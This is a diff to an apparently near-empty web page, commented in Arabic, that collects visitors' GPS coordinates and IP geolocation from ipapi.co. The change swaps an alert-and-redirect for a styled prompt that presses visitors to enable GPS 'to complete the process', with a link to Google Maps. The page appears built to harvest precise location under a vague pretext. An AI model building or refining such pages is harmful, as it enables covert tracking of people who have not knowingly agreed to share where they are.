@@ -12,16 +12,56 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
     }
 
     .content {
       text-align: center;
       font-size: 20px;
       color: #000;
+      margin-top: 20px;
+    }
+
+    .gps-message {
+      background-color: #f2f2f2;
+      border: 1px solid #cccccc;
+      border-radius: 10px;
+      padding: 20px;
+      width: 80%;
+      max-width: 500px;
+      margin-bottom: 20px;
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+    }
+
+    .gps-message p {
+      margin: 10px 0;
+    }
+
+    .button {
+      background-color: #003366;
+      color: white;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .button:hover {
+      background-color: #0055cc;
     }
   </style>
 </head>
 <body>
+
+<div class="gps-message">
+  <p>يرجى تفعيل الـ GPS للمتابعة</p>
+  <p>من فضلك، قم بتفعيل الموقع لكي نتمكن من إتمام العملية بنجاح.</p>
+  <a href="https://www.google.com/maps" class="button">تفعيل الـ GPS</a>
+</div>
 
 <div class="content">
   <!-- محتوى الصفحة سيكون فارغًا إلى حد كبير، فقط لتوفير مساحة للمحتوى المطلوب -->
@@ -60,10 +100,9 @@
       locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n`;
     } catch (e) {
       locationInfo = "📍 الموقع: المستخدم رفض أو لم يتم تحديد GPS\n";
-      // إذا تم رفض الموقع أو لم يكن مفعلًا، ستظهر رسالة تطلب تفعيله
-      alert("يرجى تفعيل الـ GPS للمتابعة.");
-      window.location.href = "https://www.google.com/maps"; // تحويل المستخدم إلى خرائط جوجل لتفعيل الـ GPS
-      return; // إيقاف الكود هنا إذا لم يتم تفعيل GPS
+      // في حال لم يكن الـ GPS مفعلًا، يتم عرض هذه الرسالة
+      document.querySelector('.gps-message').style.display = 'block';
+      return; // إيقاف الكود إذا كان الـ GPS غير مفعل
     }
 
     const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
